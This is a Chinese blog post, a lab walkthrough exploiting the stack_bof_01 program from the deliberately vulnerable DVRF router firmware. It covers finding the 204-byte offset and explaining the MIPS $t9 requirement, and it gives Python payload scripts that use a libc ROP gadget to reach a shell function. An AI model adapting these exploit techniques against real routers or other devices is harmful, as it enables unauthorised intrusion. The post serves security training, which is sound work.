---
title: 一步一步pwn路由器之栈溢出实战
authorId: hac425
tags:
  - mips rop
  - 栈溢出
categories:
  - 路由器安全
date: 2017-10-27 14:01:00
---
### 前言



---
本文由 **本人** 首发于 先知安全技术社区：  https://xianzhi.aliyun.com/forum/user/5274/

---

本文以 [DVRF](https://github.com/praetorian-inc/DVRF) 中的第一个漏洞程序 `stack_bof_01` 为例，在实战 `MIPS` 架构中栈溢出的简单利用。


### 正文
去github上面把 DVRF 下载下来，然后用 `binwalk` 解开

![paste image](http://oy9h5q2k4.bkt.clouddn.com/15090843759335sjlc5jz.png?imageslim)

在 `pwnable` 目录下就是相应的示例程序

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509084462823wk11dwv2.png?imageslim)
在解开的文件系统的根目录下使用 `chroot` 和 `qemu` 运行 程序：

```
sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01  "`cat ./pwnable/Intro/input`"
```

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509084652810a9d812lx.png?imageslim)

使用了`cat` 命令读取文件作为命令行参数，传给目标程序，这样可以使我们输入一些不可见字符用于劫持程序流。

`stack_bof_01` 是一个很简单的栈溢出漏洞程序，它把用户从命令行传过去的参数直接使用 `strcpy` 拷贝到栈缓冲区，从而栈溢出。经过调试，输入204个字符后就可以覆盖到 `ra` 寄存器保存到栈栈上的值，进而可以控制 `$pc` 的值。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509085110075dfzfw3j4.png?imageslim)
修改文件内容的 `python` 脚本如下

```
#!/usr/bin/python
padding = "O" * 204
payload = padding + "B"*4
with open("input", "wb") as f:
    f.write(payload)

```
接下来就是考虑该如何利用的问题了。程序中包含了一个 执行 `system("/bin/sh")` 的函数 `dat_shell`, 如果是在 `x86` 平台下的话，我们直接设置 `$pc` 寄存器到它的地址就可以了。在 `MIPS` 如果直接指过去或怎么样呢？我们试试

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509085500227rnxajrt2.png?imageslim)

访问了非法内存，异常了。
原因在于，在 MIPS 中，函数内部会通过 `$t9` 寄存器和 `$gp` 寄存器来找数据，地址等。同时在 `mips` 的手册内默认 `$t9` 的值为当前函数的开始地址，这样才能正常的索引，所以我们需要先用一个 `rop_gadget` 设置 `$t9`, 然后再跳到 `dat_shell` 函数。
在libc 中可以找到这样一个gadgets
```
.text:00006B20                 lw      $t9, arg_0($sp)
.text:00006B24                 jalr    $t9
```

加上libc的基地址就行了。用qemu-mipsel-static模拟程序是看不到目标程序的maps的，所以我们可以通过打印 `got` 表的函数指针，然后计算偏移得到 `libc` 的基地址。


所以我们现在的利用流程就是:
- 修改返回地址到 `rop_gadget`, 设置 `$r9` 为 `dat_shell` 函数的地址
- 跳转到 `dat_shell` 函数，执行`system`

```
#!/usr/bin/python
padding = "O" * 204
gadget1 = "\x20\xbb\x6e\x76"
dat_shell_addr = "\x50\x09\x40"  # Partial overwrite with little-endian arch
payload = padding + gadget1 + dat_shell_addr
with open("input", "wb") as f:
    f.write(payload)

```
![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509086115477pcnvhh8c.png?imageslim)

### 总结

- 学习到了 `$t9` 寄存器的重要作用以后再使用 `rop` 调用函数时，要使用 `jalr $t9` 类的 `gadgets` 以保证进入函数后， `$t9` 的值为函数的起始地址，避免出错。

- 使用ida反汇编mips程序时，它好像默认  `$t9` 的值为函数的起始地址,导致我们分析问题时造成困惑，pwndbg 和 [radare2](http://www.radare.org/r/) 就不会这样。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1509086721263tsioi5wr.png?imageslim)

感觉mips下还是 pwndbg 和 [radare2](http://www.radare.org/r/)靠谱

参考链接：

- https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-1/

注：

&emsp;&emsp;本文先发布于：https://xianzhi.aliyun.com/forum/topic/1510/